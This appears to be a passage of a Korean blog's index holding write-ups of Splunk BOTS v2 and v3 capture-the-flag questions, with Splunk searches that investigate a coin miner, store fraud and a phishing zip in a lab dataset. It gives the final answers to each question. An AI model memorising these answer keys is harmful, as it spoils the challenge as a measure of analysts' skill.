알아낼 수 있습니다.sourcetype=stream:dns query=*coinhive*| stats dc(query)답 : 6212\tUsing Splunk’s event order functions, what is the first seen signature ID of the coin miner threat according to Frothly’s Symantec Endpoint Protection (SEP) data?Splunk의 이벤트 정렬 기능을 사용할 때 Frothly의 SEP(Symantec Endpoint Protection) 데이터에 따르면 코인 마이너 위협의 첫 번째 signature ID는 무엇입니까?  hint#1    Use symantec:ep:security:file as the sourcetype.    sourcetype symantec:ep:security:file에서 조사하세요.  hint#2    First seen refers to the first event in the search results. See: https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Eventorderfunctions    처음 발견한 것은 검색 결과의 첫 번째 이벤트를 나타냅니다. 참조: https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Eventorderfunctionssourcetype 중 symantec:ep:security:file이 눈에 띕니다.symantec:ep:security:file는 단말의 보안로그가 있다고 설명되어있습니다. Source types for the Splunk Add-on for Symantec Endpoint Protectionsourcetype symantec:ep:security:file에 Event_Description 필드에 SID라는 내용이 있습니다.해당 sourcetype에서 우리가 눈여겨봐야할 필드는 아래와 같습니다.actionCIDS_Signature_IDCIDS_Signature_StringCIDS_Signature_SubIDEvent_DescriptionHost_NameRemote_Host_IPseveritySHA_256signatureuservendor_severity이 필드들을 시간순서대로 살펴봅니다.sourcetype=symantec:ep:security:file *coin*| table _time action CIDS_Signature_ID CIDS_Signature_String CIDS_Signature_SubID Event_Description Host_Name Remote_Host_IP severity SHA_256 signature user vendor_severity| sort _time결과 중 CIDS_Signature_ID은 30356, 30358 두가지가 발견되었는데, _time의 값은 2018/08/20 13:37:40로 같습니다. 처음 발견된 값을 찾기위해 first함수를 사용합니다. (용법은 hint#2 참고)sourcetype=symantec:ep:security:file *coin*| table _time action CIDS_Signature_ID CIDS_Signature_String CIDS_Signature_SubID Event_Description Host_Name Remote_Host_IP severity SHA_256 signature user vendor_severity| stats first(CIDS_Signature_ID)            first(CIDS_Signature_ID)                  30358      first 함수를 이용해 제일 처음 발견된 이벤트의 SID는 30358입니다.답 : 30358213\tAccording to Symantec’s website, what is the severity of this specific coin miner threat?시만텍 웹사이트에 따르면 이 특정 코인 채굴기 위협의 심각성은 무엇입니까?  hint#1    Google search for the signature ID from the previous question and the term Symantec together.    Google은 이전 질문의 signatrue ID와 Symantec이라는 용어를 함께 검색합니다.  hint#2    Symantec has an online database of all signature IDs detected by SEP here: https://www.broadcom.com/support/security-center/attacksignatures    시만텍은 SEP에서 탐지한 모든 서명 ID의 온라인 데이터베이스를 여기에서 보유하고 있습니다. https://www.broadcom.com/support/security-center/attacksignatures악성코드의 심각도를 묻는 문제입니다. 212문제에서 serverity, vendor_severity의 값을 보면 각각 high, Major란 값을 얻을 수 있습니다. 하지만 답은 6글자입니다.시만텍 웹사이트 OSINT에서 심각도를 찾아봅니다.(symantec인데 도메인이 broadcom이어서 처음에 헷갈렸습니다)Attack Signatures를 클릭합니다.해당 검색창에 212번문제에서 파악한 JSCoinminer를 검색합니다.여러개가나오는데, 그중 Web Attack: JSCoinminer Download 8을 클릭합니다.사이트에서 심각도는 Medium임을 알 수 있습니다. (Severity:Medium)답 : Medium214\tWhat is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat? (Example: ahamilton instead of ahamilton.mycompany.com)암호화폐 위협을 물리쳤다는 증거를 보여주는 유일한 Frothly 엔드포인트의 짧은 호스트 이름은 무엇입니까? (예: ahamilton.mycompany.com 대신 ahamilton)  hint#1    Figure out what applications were blocked. The WinEventLog:Application sourcetype is helpful, as is the symantec:ep:security:file sourcetype.    차단된 응용 프로그램을 파악합니다. WinEventLog:Application 소스 유형은 symantec:ep:security:file 소스 유형과 마찬가지로 유용합니다.212번문제에서 JSCoinminer를 Block한 host는 BTUN-L입니다.답 : BTUN-L215\tWhat is the FQDN of the endpoint that is running a different Windows operating system edition than the others?다른 Windows 운영 체제 버전과 다른 버전을 실행하는 끝점의 FQDN은 무엇입니까?  hint#1    Frothly gathers system information from Cisco NVM clients on their mobile workstations.    Frothly는 모바일 워크스테이션의 Cisco NVM 클라이언트로부터 시스템 정보를 수집합니다.&lt;/detail&gt;window 혹은 OS 관련 sourcetype에 해당 데이터가 있을것으로 예상됩니다.windows를 키워드로 어떤 sourcetype이 있는지 조사해봅니다.```windows| stats count by sourcetype```|sourcetype\t|count||---|---||WinHostMon\t|72002||wineventlog\t|47827||xmlwineventlog\t|9212|상위 3개가 window와 관련된 sourcetype입니다.WinHostMon부터 조사해봅니다.WinHostMon 중 눈여겨볼 필드는 **OS ComputerName**입니다.```sourcetype=WinHostMon OS=*| dedup host OS ComputerName | table host OS ComputerName```|host\t|OS|\tComputerName||---|---|---||FYODOR-L\t| Microsoft Windows 10 Pro|\t        FYODOR-L\t||JWORTOS-L|\tMicrosoft Windows 10 Pro|\t        JWORTOS-L\t||BSTOLL-L\t| Microsoft Windows 10 Enterprise|\tBSTOLL-L\t||BTUN-L\t  | Microsoft Windows 10 Pro\t|       BTUN-L||MKRAEUS-L|\tMicrosoft Windows 10 Pro\t|       MKRAEUS-L\t||BGIST-L\t| Microsoft Windows 10 Pro\t|       BGIST-L||PCERF-L\t| Microsoft Windows 10 Pro\t|       PCERF-L||ABUNGST-L|\tMicrosoft Windows 10 Pro\t|       ABUNGST-L\t|BSTOLL-L 하나만 Enterprise버전을 사용하고 있습니다. domain을 알아야하니 BSTOLL을 키워드로 찾아봅니다.(microsoft는 로그에 없을 수도 있어 제외합니다)```BSTOLL \"Windows 10 Enterprise\"```sourcetype syslog에 2개의 이벤트가 있습니다.```Aug 20 13:37:20 splunkhwf.froth.ly  fv=\"nvzFlow_v3\" vsn=\"BSTOLL-L.froth.ly\" udid=\"1DD75FEDA01F1AE457AF4307EA6DCA0946CFED56\" osn=\"WinNT\" osv=\"10.0.17134\" ose=\"Windows 10 Enterprise\" sm=\"VMware, Inc.\" st=\"x64\"host=splunkhwf.froth.ly source=cisconvmsysdata sourcetype=syslog```vsn필드에 도메인 값이 있음을 확인할 수 있습니다.답 : BSTOLL-L.froth.ly216\tAccording to the Cisco NVM flow logs, for how many seconds does the endpoint generate Monero cryptocurrency? Answer guidance: Round to the nearest second without the unit of meadsure.Cisco NVM 흐름 로그에 따르면 엔드포인트는 몇 초 동안 Monero 암호 화폐를 생성합니까? 답변 안내: 측정 단위 없이 가장 가까운 초로 반올림합니다.  hint#1    Use cisconvmflowdata as the source to give you details about network flows, including the start and end times of flows.    cisconvmflowdata를 소스로 사용하여 흐름의 시작 및 종료 시간을 포함하여 네트워크 흐름에 대한 세부 정보를 제공합니다.  hint#2    In order for Monero to be mined after it is created on a laptop, the laptop must be connected to one or more mining servers.    모네로가 노트북에서 생성된 후 채굴되기 위해서는 노트북이 하나 이상의 채굴 서버에 연결되어 있어야 합니다.  hint#3    Calculate the start and end times of communication to the mining servers according to the NVM fields. Then calculate the delta between the first and last communications. This can all be done within a Splunk search.    NVM 필드에 따라 마이닝 서버와의 통신 시작 및 종료 시간을 계산합니다. 그런 다음 첫 번째 통신과 마지막 통신 간의 델타를 계산합니다. 이 모든 작업은 Splunk 검색 내에서 수행할 수 있습니다.nvm은 데이터 유출, 승인되지 않은 애플리케이션 또는 SaaS 서비스, 보안 회피 및 악성코드 활동을 고객들이 탐지할 수 있는 고유한 기기 ID, 기기 이름, 프로세스/컨테이너 이름, 상위 프로세스, 권한 변경, 소스/목적지 도메인, DNS 정보 및 네트워크 인터페이스 등의 보안 정보 데이터입니다.(https://www.ciokorea.com/ciostory/152668 참고)  [cisco flow data 공식 문서](https://community.cisco.com/t5/security-documents/cisco-network-visibility-nvm-collector/ta-p/4309825)host나 sourcetype이 아닌, source에 cisconvmflowdata가 있습니다.coinhive에 요청한 정보를 찾아봅시다.```source=cisconvmflowdata coinhive```6개의 이벤트가 나옵니다. coinhive url요청 시작과 끝 필드를 찾아 계산해봅시다.공식문서에 따르면 요청시간은 fss, 종료시간은 fes입니다.![fss fes](https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-10-30-22-01-41.png)시작시간과 끝시간을 계산해봅시다.```source=cisconvmflowdata coinhive| stats min(fss) as starttime, max(fes) as endtime| eval duration=endtime-starttime| table duration```|duration||---||1667|하지만 답은 1666입니다.이유를 찾으신분은 제보바랍니다.답 : 1666217\tWhat kind of Splunk visualization was in the first file attachment that Bud emails to Frothly employees to illustrate the coin miner issue? Answer guidance: Two words. (Example: choropleth map)  Bud가 코인 채굴 문제를 설명하기 위해 Frothly 직원에게 이메일로 보낸 첫 번째 첨부 파일에는 어떤 종류의 Splunk 시각화가 포함되어 있습니까? 답변 안내: 두 단어. (예: 등치 지도)  hint#1    Use stream:smtp as the sourcetype to find details of emails between Frothly employees.    stream:smtp를 소스 유형으로 사용하여 Frothly 직원 간의 이메일 세부 정보를 찾습니다.  hint#2    Images are encoded within email in base64. Bud would have sent this email after the mining activity started.    이미지는 이메일 내에서 base64로 인코딩됩니다. Bud는 채굴 활동이 시작된 후에 이 이메일을 보냈을 것입니다.  hint#3    You will need to find a site to decode the base64 to a viewable image. CyberChef is a good one!    base64를 볼 수 있는 이미지로 디코딩하려면 사이트를 찾아야 합니다. CyberChef는 좋은 방법입니다!송신자에 bud가 포함되고 attach_filename 포함된 이메일로그를 조사해봅니다.```sourcetype=stream:smtp sender=*bud* attach_filename{}=*```attach_filename이 image001.jpg, image002.jpg, image003.jpg이 있습니다.이메일에서는 이미지가 base64로 인코딩 되므로, base64를 찾아 이미지로 변환해봅시다.변환할 수 있는 CyberChef라는 사이트가 있습니다.  [CyberChef(https://gchq.github.io/CyberChef/)](https://gchq.github.io/CyberChef/) Content-Type이 Content-Type: image/jpeg; 부분의 base64코드를 찾아봅시다.content{}필드 중간에 인코딩된 base64값이 있습니다.![](https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-10-30-22-39-14.png)image002.jpg는 **/9j/4AAQSkZJRgABAQEAjACMAAD/**부터 **rk38qKKAP//Z**입니다.image003.jpg은 **/9j/4AAQSkZJRgABAQEAjACMAAD/**부터 **oJoooA//2Q==**입니다.cyberchef에서 각각 render image를 클릭하고, input을 base64변경하면 image결과가 나옵니다.- Cyberchef  ![Cyberchef](https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-10-30-22-47-57.png)- image002.jpg![line chart](https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-10-30-22-46-14.png)- image003.jpg![column chart](https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-10-30-22-47-25.png)답 : column chart",
        "url": "/splunk-BOTS-v3-part1"
    }
    ,
    
    "splunk-bots-v2-part5": {
        "title": "splunk-bots-v2 write up(5) - END",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과APT Scenarios:In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.Hunting Scenarios:PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTPExfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNSExfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.500\tIndividual clicks made by a user when interacting with a website are associated with each other using session identifiers. You can find session identifiers in the stream:http sourcetype. The Frothly store website session identifier is found in one of the stream:http fields and does not change throughout the user session. What session identifier is assigned to dberry398@mail.com when visiting the Frothly store for the very first time? Answer guidance: Provide the value of the field, not the field name.웹 사이트와 상호 작용할 때 사용자가 만든 개별 클릭은 세션 식별자를 사용하여 서로 연결됩니다. stream:http sourcetype에서 세션 식별자를 찾을 수 있습니다. Frothly 상점 웹사이트 세션 식별자는 stream:http 필드 중 하나에서 찾을 수 있으며 사용자 세션 전체에서 변경되지 않습니다. Frothly 스토어를 처음 방문할 때 dberry398@mail.com에 할당된 세션 식별자는 무엇입니까? 답변 안내: 필드 이름이 아닌 필드 값을 제공하십시오.  hint#1    Find the source IP address that our user of interest is using, then broaden your search such that you can view all events specific to the user's src ip address.    관심 사용자가 사용하고 있는 소스 IP 주소를 찾은 다음 사용자의 src IP 주소와 관련된 모든 이벤트를 볼 수 있도록 검색을 확장하십시오.  hint#2    HTTP cookies often contain information specific to a user session, including session identifiers.    HTTP 쿠키는 종종 세션 식별자를 포함하여 사용자 세션에 특정한 정보를 포함합니다.  hint#3    After you get the events specific to the user's src ip address, you can append a '| reverse |table cookie' to get a better view of the cookies that the user clicked.    사용자의 src IP 주소와 관련된 이벤트를 얻은 후 '|reverse |table cookie'를 사용하여 사용자가 클릭한 쿠키를 더 잘 볼 수 있습니다.보통 seesion정보는 cookie필드에 있으므로, decode해서 해당 값을 봅시다.sourcetype=stream:http dberry398@mail.com| eval decoded=urldecode(cookie)| table decoded            decoded                  store=default; mage-translation-storage={}; mage-translation-file-version={}; form_key=lwh9Ql7oUbnJUqxR; PHPSESSID=o6fc5a2rdoufmb8en8bqvfbav2; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={“cart”:1502757091,”customer”:null,”messages”:null,”compare-products”:null,”product_data_storage”:null}; private_content_version=837d56d7fe0264712bb5f12adacd2dc5; mage-messages=[{“type”:”success”,”text”:”Thank you for registering with Main Website Store.”}]; X-Magento-Vary=20b556236a9f73d55ee9ffb5a21ffc45a5f6d878              store=default; mage-translation-storage={}; mage-translation-file-version={}; PHPSESSID=mlhg4l49hi8hn93b2abtr75j42; form_key=lwh9Ql7oUbnJUqxR; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mage-messages=; private_content_version=becda8344cf560edfa267a78a663f962; X-Magento-Vary=9bf9a599123e6402b85cde67144717a08b817412; section_data_ids={“cart”:1502756249,”customer”:1502756125,”compare-products”:1502756125,”product_data_storage”:1502756125,”last-ordered-items”:1502756125,”directory-data”:1502756126,”review”:1502756125,”wishlist”:1502756125,”recently_viewed_product”:1502756125,”recently_compared_product”:1502756125,”paypal-billing-agreement”:1502756125}      두개 이벤트 중 값이 같고, session값으로 보이는 항목은 form_key입니다.답 : lwh9Ql7oUbnJUqxR501\tHow many unique user ids are associated with a grand total order of $1000 or more?총 주문 금액이 $1000 이상인 고유 사용자 ID는 몇 개입니까?  hint#1    When a user fills out a web form passing information such as username, password, credit card numbers, etc., it's passed via a standard http field (form_data) which is captured by stream:http. Extract the username from that field and store it in a new field.    사용자가 사용자 이름, 암호, 신용 카드 번호 등과 같은 정보를 전달하는 웹 양식을 작성하면 stream:http에 의해 캡처되는 표준 http 필드(form_data)를 통해 전달됩니다. 해당 필드에서 사용자 이름을 추출하고 새 필드에 저장합니다.  hint#2    You're going to need to look deeper into the packet at a field called dest_content to extract the grand order total. Look for the following string and use it in a regular expression to capture the value: 'grand_total'.    총 주문량을 추출하려면 dest_content라는 필드에서 패킷을 더 깊이 조사해야 합니다. 다음 문자열을 찾아 정규식에서 사용하여 값을 캡처합니다. 'grand_total'.  hint#3    The 'stats' command is useful for helping you to link several pieces of context together that occur within a single clickstream.    'stats' 명령은 단일 클릭스트림 내에서 발생하는 여러 컨텍스트를 함께 연결하는 데 유용합니다.주문금액을 묻는걸 보아하니 웹관련 이벤트인 stream:http에서 해당데이터를 찾을 수 있을것으로 생각됩니다.sourcetype=\"stream:http\" grand_total| rex field=dest_content \"\\\"totals\\\":{\\\"grand_total\\\":(?&lt;cost&gt;\\w*),\"| search cost=* | where cost&gt;1000| dedup src_ip| table cost답 : 7502\tWhich user, identified by their email address, edited their profile before placing an order over $1000 in the same clickstream? Answer guidance: Provide the user ID, not other values found from the profile edit, such as name.이메일 주소로 식별되는 어떤 사용자가 동일한 클릭스트림에서 $1000 이상 주문하기 전에 프로필을 수정했습니까? 답변 안내: 이름과 같이 프로필 편집에서 찾은 다른 값이 아닌 사용자 ID를 제공합니다.  hint#1503\tWhat street address was used most often as the shipping address across multiple accounts, when the billing address does not match the shipping address? Answer example: 123 Sesame St  hint#1504\tWhat is the domain name used in email addresses by someone creating multiple accounts on the Frothly store website (http://store.froth.ly) that appear to have machine-generated usernames?  hint#1505\tWhich user ID experienced the most logins to their account from different IP address and user agent combinations? Answer guidance: The user ID is an email address.  hint#1506\tWhat is the most popular coupon code being used successfully on the site?  hint#1507\tSeveral user accounts sharing a common password is usually a precursor to undesirable scenario orchestrated by a fraudster. Which password is being seen most often across users logging into http://store.froth.ly.  hint#1508\tWhich HTML page was most clicked by users before landing on http://store.froth.ly/magento2/checkout/ on August 19th? Answer guidance: Use earliest=1503126000 and latest=1503212400 to identify August 19th. Answer example: http://store.froth.ly/magento2/bigbrew.html  hint#1509\tWhich HTTP user agent is associated with a fraudster who appears to be gaming the site by unsuccessfully testing multiple coupon codes?  hint#1",
        "url": "/splunk-BOTS-v2-part5"
    }
    ,
    
    "splunk-bots-v2-part4": {
        "title": "splunk-bots-v2 write up(4)",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과APT Scenarios:In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.Hunting Scenarios:PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTPExfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNSExfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.400\tA Federal law enforcement agency reports that Taedonggang often spearphishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?연방 법 집행 기관은 대동강이 종종 비밀번호로 열어야 하는 zip 파일로 피해자를 스피어피싱한다고 보고합니다. 대동강이 Frothly에게 보낸 첨부 파일 이름은 무엇입니까?  hint#1    Frothly uses the Splunk wiredata product 'Stream' to collect email metadata. Look at the sourcetype stream:smtp    Frothly는 Splunk wiredata 제품 'Stream'을 사용하여 이메일 메타데이터를 수집합니다. sourcetype stream:smtp을 살펴보세요.  hint#2    The question mentions that Taedonggang sends a 'zip' file. Look in the sourcetype in hint 1 for attachments with a .zip extension.    질문은 대동강이 'zip' 파일을 보낸다고 언급합니다. .zip 확장자를 가진 첨부 파일에 대해서는 힌트 1의 소스 유형을 확인하십시오.메일에 있는 확장자.zip의 첨부파일명을 확인해봅시다.sourcetype=stream:smtp *.zip*invoice.zip 한가지 결과만 나옵니다.뒷문제를 풀기위해 필요한 정보를 파악해둡니다.            _time      sender      receiver{}      attach_filename{}      attach_content_md5_hash{}      received_by_name      src_ip                  2017/08/24 03:27:29.837      Jim Smith jsmith@urinalysis.com      btun@froth.ly      invoice.zip      20e368e2c9c6e91f24eeddd09369c4aa      MWHPR18CA0034.outlook.office365.com      104.47.37.62              2017/08/24 03:27:14.323      Jim Smith jsmith@urinalysis.com      abungstein@froth.ly      invoice.zip      20e368e2c9c6e91f24eeddd09369c4aa      CY4PR18CA0071.outlook.office365.com      104.47.41.43              2017/08/24 03:27:33.239      Jim Smith jsmith@urinalysis.com      fyodor@froth.ly      invoice.zip      20e368e2c9c6e91f24eeddd09369c4aa      BY1PR18CA0020.outlook.office365.com      104.47.38.87              2017/08/24 03:27:24.557      Jim Smith jsmith@urinalysis.com      klagerfield@froth.ly      invoice.zip      20e368e2c9c6e91f24eeddd09369c4aa      CY4PR18CA0058.outlook.office365.com      104.47.42.76      메일내용 중간에 보면 base64로 인코딩된 데이터가 있습니다.디코딩 해봅니다.시작 : UEsDBBQACQAIAEO끝   : QAAAAhAAAAAAA==zip파일의 암호는 912345678입니다.디코딩한 데이터를 zip파일로 저장한 후 압축해제하면 invoice.doc파일이 있습니다.ivan@ubuntu:~$ unzip invoice.zipArchive:  invoice.zip[invoice.zip] invoice.doc password:  inflating: invoice.docivan@ubuntu:~$ strings invoice.doc | headbjbjCongrats! It looks like you have a virustotal account and chose to live on the edge. If you find this turn it in for some CyberEastEgg points!!![Content_Types].xml#!MB;c=1_rels/.relstheme/theme/themeManager.xmlsQ}#theme/theme/theme1.xmlivan@ubuntu:~$ file invoice.docinvoice.doc: Composite Document File V2 Document, Little Endian, Os: MacOS, Version 10.3, Code page: 10000, Author: Ryan Kovar, Template: Normal.dotm, Last Saved By: Ryan Kovar, Revision Number: 3, Name of Creating Application: Microsoft Macintosh Word, Total Editing Time: 01:00, Create Time/Date: Sun Jul  9 22:07:00 2017, Last Saved Time/Date: Wed Aug  2 05:26:00 2017, Number of Pages: 1, Number of Words: 21, Number of Characters: 125, Security: 0해당 파일의 내용을 파악해보았습니다.virustotal linkRelation탭을 보면 scan했던 IP인 45.77.65.211가 있습니다.답 : invoice.zip401\tThe Taedonggang APT group encrypts most of their traffic with SSL. What is the “SSL Issuer” that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.대동강 APT 그룹은 대부분의 트래픽을 SSL로 암호화합니다. 대부분의 트래픽에 사용하는 “SSL Issuer”는 무엇입니까? 답변 지침: 공백을 포함하여 필드를 정확하게 복사합니다.  hint#1    You might need to get more information before you tackle this question. Have you figured 